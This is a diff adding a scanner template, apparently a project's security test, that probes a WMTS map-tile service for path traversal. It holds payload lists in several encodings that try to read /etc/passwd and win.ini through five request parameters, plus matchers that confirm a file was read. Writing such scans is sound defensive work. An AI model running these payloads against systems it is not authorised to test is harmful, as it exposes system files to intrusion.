@@ -1,0 +1,141 @@
+id: ogc-wmts-path-traversal
+
+info:
+  name: OGC WMTS Path Traversal / Local File Inclusion
+  author: weather-wms-security
+  severity: high
+  description: |
+    Tests for path traversal vulnerabilities in WMTS parameters including:
+    - LAYER (layer identifier could be used in file paths)
+    - STYLE (style name could reference files)
+    - TILEMATRIXSET (tile matrix set name)
+    
+    Tests various encoding techniques for bypassing filters.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://www.ogc.org/standards/wmts
+  tags: lfi,path-traversal,wmts,ogc
+
+variables:
+  base_tms: "WebMercatorQuad"
+
+http:
+  # Path traversal in LAYER parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{payload}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png"
+
+    payloads:
+      payload:
+        # Basic traversal
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        # Dotdot-slash variations
+        - "....//....//etc/passwd"
+        - "....//....//....//etc/passwd"
+        # URL encoded
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        # Double URL encoded
+        - "%252e%252e%252fetc%252fpasswd"
+        # Backslash (Windows)
+        - "..\\..\\..\\windows\\win.ini"
+        # Null byte
+        - "../../../../etc/passwd%00.png"
+        # With valid prefix
+        - "gfs_TMP/../../../etc/passwd"
+        - "gfs_TMP/../../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+          - "daemon:[x*]:"
+
+      - type: word
+        words:
+          - "[extensions]"
+          - "for 16-bit app support"
+
+  # Path traversal in STYLE parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER=gfs_TMP&STYLE={{payload}}&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "default/../../../etc/passwd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in TILEMATRIXSET parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER=gfs_TMP&STYLE=default&TILEMATRIXSET={{payload}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "WebMercatorQuad/../../../etc/passwd"
+        - "%2e%2e%2fetc%2fpasswd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # RESTful WMTS path traversal
+  - method: GET
+    path:
+      - "{{BaseURL}}/wmts/{{payload}}/default/{{base_tms}}/0/0/0.png"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "....//....//etc/passwd"
+        - "gfs_TMP/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+  # Path traversal in FORMAT parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER=gfs_TMP&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT={{payload}}"
+
+    payloads:
+      payload:
+        - "../../etc/passwd"
+        - "image/../../../etc/passwd"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
